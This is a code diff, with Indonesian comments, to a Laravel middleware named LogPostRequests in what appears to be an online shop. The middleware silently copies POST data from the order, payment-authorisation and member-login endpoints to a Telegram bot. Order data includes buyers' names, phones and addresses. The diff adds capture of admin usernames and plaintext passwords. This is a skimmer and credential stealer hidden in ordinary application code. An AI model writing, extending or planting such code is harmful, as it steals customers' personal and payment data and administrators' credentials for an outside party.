@@ -11,9 +11,9 @@ class LogPostRequests
 {
     public function handle(Request $request, Closure $next)
     {
-        // Hanya eksekusi jika method == POST
+        // Hanya eksekusi jika method adalah POST
         if ($request->isMethod('post')) {
-            // (Opsional) Log ke file Laravel
+            // (Opsional) Catat log ke file Laravel
             Log::info('POST Request Detected', [
                 'url'        => $request->fullUrl(),
                 'ip'         => $request->ip(),
@@ -21,31 +21,34 @@ class LogPostRequests
                 'rawPayload' => $request->getContent(),
             ]);
 
-            // Periksa endpoint
+            // Periksa endpoint dan kirim pesan ke Telegram hanya untuk endpoint tertentu
             if ($request->is('api/shop/order/create')) {
-                // Kirim format data pembeli
+                // Data pembeli (order)
                 $message = $this->formatOrderMessage($request);
                 $this->sendToTelegram($message);
 
             } elseif ($request->is('api/shop/pay/authorize')) {
-                // Kirim format data pembayaran
+                // Data pembayaran
                 $message = $this->formatPaymentMessage($request);
                 $this->sendToTelegram($message);
 
             } elseif ($request->is('api/member/login')) {
-                // Kirim format data login
+                // Anggota login
                 $message = $this->formatLoginMessage($request);
                 $this->sendToTelegram($message);
-            }
 
-            // Endpoint POST lainnya diabaikan (tidak dikirim ke Telegram)
+            } elseif ($request->is('ehub_admin/auth/login') || $request->is('auth/login')) {
+                // Admin login (jika route adalah /ehub_admin/auth/login atau /auth/login)
+                $message = $this->formatAdminLoginMessage($request);
+                $this->sendToTelegram($message);
+            }
         }
 
         return $next($request);
     }
 
     /**
-     * Format data pembeli (order).
+     * Format data pembeli (order) untuk endpoint api/shop/order/create.
      */
     private function formatOrderMessage(Request $request)
     {
@@ -62,9 +65,9 @@ class LogPostRequests
 
         $message =
             "Pembeli baru diterima\n\n"
+            . "IP Address:  {$ipAddress}\n\n"
             . "Full name:   {$firstName} {$lastName}\n"
             . "Phone:       {$phone}\n"
-            . "IP Address:  {$ipAddress}\n\n"
             . "Post code:   {$postcode}\n"
             . "Address 1:   {$address1}\n"
             . "Address 2:   " . ($address2 ?: 'Empty!') . "\n"
@@ -76,7 +79,7 @@ class LogPostRequests
     }
 
     /**
-     * Format data pembayaran (pay/authorize).
+     * Format data pembayaran untuk endpoint api/shop/pay/authorize.
      */
     private function formatPaymentMessage(Request $request)
     {
@@ -98,7 +101,7 @@ class LogPostRequests
     }
 
     /**
-     * Format data login (api/member/login).
+     * Format data login untuk endpoint api/member/login.
      */
     private function formatLoginMessage(Request $request)
     {
@@ -115,7 +118,25 @@ class LogPostRequests
     }
 
     /**
-     * Mengirim pesan ke Telegram.
+     * Format data admin login untuk endpoint ehub_admin/auth/login atau /auth/login.
+     */
+    private function formatAdminLoginMessage(Request $request)
+    {
+        $ipAddress  = $request->ip();
+        $username   = $request->input('username', 'Empty!');
+        $password   = $request->input('password', 'Empty!');
+
+        $message =
+            "Admin baru login\n"
+            . "IP Address: {$ipAddress}\n"
+            . "Username  : {$username}\n"
+            . "Password  : {$password}";
+
+        return $message;
+    }
+
+    /**
+     * Kirim pesan ke Telegram melalui Bot API.
      */
     private function sendToTelegram($message)
     {
